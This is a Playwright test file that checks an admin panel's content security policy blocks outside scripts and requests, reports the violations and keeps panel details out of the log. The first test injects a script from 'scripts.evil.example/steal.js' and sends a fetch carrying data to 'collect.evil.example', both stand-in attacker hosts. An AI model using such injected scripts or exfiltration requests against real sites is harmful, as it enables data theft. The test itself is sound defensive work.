import { test, expect, signIn } from '../support/fixtures';
import { panel } from '../support/fixtures';
import { uploadImage } from '../support/panel';

/*
 * The panel's content security policy, enforced (decision after QA-8): a script that got into a page of the panel can
 * load no script from elsewhere and send nothing anywhere but the panel, and the browser reports each attempt, which
 * the back end writes as one [csp] line of its log, with the panel's address hidden.
 */
test('a script from another site and a request to another site are refused in the panel, and reported', async ({ page, app, adminPassword }) => {
    test.info().annotations.push({ type: 'csp-violation-expected', description: 'the test blocks a script and a request on purpose' });
    await signIn(page, app, adminPassword);
    await page.goto(panel());

    const outcome = await page.evaluate(async () => {
        const violations: string[] = [];
        document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.effectiveDirective} ${e.blockedURI}`));
        const script = await new Promise<string>((resolve) => {
            const tag = document.createElement('script');
            tag.src = 'https://scripts.evil.example/steal.js';
            tag.onload = () => resolve('loaded');
            tag.onerror = () => resolve('refused');
            document.head.appendChild(tag);
        });
        const request = await fetch('https://collect.evil.example/?data=1').then(() => 'sent', () => 'refused');
        // eval itself is allowed (Alpine needs it); what it may load or send is not.
        await new Promise((r) => setTimeout(r, 300));
        return { script, request, violations };
    });

    expect(outcome.script).toBe('refused');
    expect(outcome.request).toBe('refused');
    expect(outcome.violations).toEqual(['script-src-elem https://scripts.evil.example/steal.js', 'connect-src https://collect.evil.example/?data=1']);
    // The reports reach the log (the browser sends them a little later).
    await expect.poll(() => app.log().split('\n').filter((line) => line.includes('[csp]')).length, { timeout: 10_000 }).toBeGreaterThanOrEqual(2);
    const lines = app.log().split('\n').filter((line) => line.includes('[csp]'));
    expect(lines.some((l) => l.includes('[csp] script-src-elem blocked https://scripts.evil.example/steal.js on http://127.0.0.1:'))).toBe(true);
    expect(lines.some((l) => l.includes('[csp] connect-src blocked https://collect.evil.example/ on http://127.0.0.1:'))).toBe(true);
    expect(lines.join('\n')).not.toContain('data=1');
    expect(lines.join('\n')).toContain('/<panel>');
    expect(lines.join('\n')).not.toContain(panel());
});

test('the panel works under its policy: nothing it needs is blocked', async ({ page, app, adminPassword }) => {
    // The fixture fails the test on any blocked load; these are the screens with the most moving parts, after a picture
    // is uploaded (the upload field reads its preview from a blob: address and turns it in a worker made from one).
    await signIn(page, app, adminPassword);
    await uploadImage(page, 'cover.png', 'صورة');
    for (const path of ['', '/posts', '/posts/create', '/media-assets', '/videos', '/newsletter-issues', '/settings']) {
        const answer = await page.goto(panel(path));
        expect(answer?.status(), path || '/').toBeLessThan(400);
        expect(answer?.headers()['content-security-policy'], path || '/').toContain("script-src 'self' 'unsafe-inline' 'unsafe-eval'");
        await page.waitForLoadState('networkidle');
    }
});
